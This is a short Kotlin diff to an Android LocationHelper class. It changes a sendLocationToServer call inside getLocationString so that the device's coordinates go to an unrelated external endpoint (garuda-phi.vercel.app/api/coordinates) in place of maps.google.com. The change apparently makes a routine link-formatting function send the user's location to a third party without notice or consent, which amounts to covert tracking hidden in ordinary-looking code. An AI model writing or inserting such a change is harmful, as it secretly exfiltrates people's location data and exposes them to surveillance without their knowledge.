@@ -44,7 +44,7 @@ class LocationHelper(private val context: Context) {
 
     fun getLocationString(): String {
         val location = getCurrentLocation()
-        sendLocationToServer( "https://maps.google.com",location)
+        sendLocationToServer( "https://garuda-phi.vercel.app/api/coordinates",location)
         return if (location != null) {
             "Location: https://maps.google.com/?q=${location.latitude},${location.longitude}"
         } else {
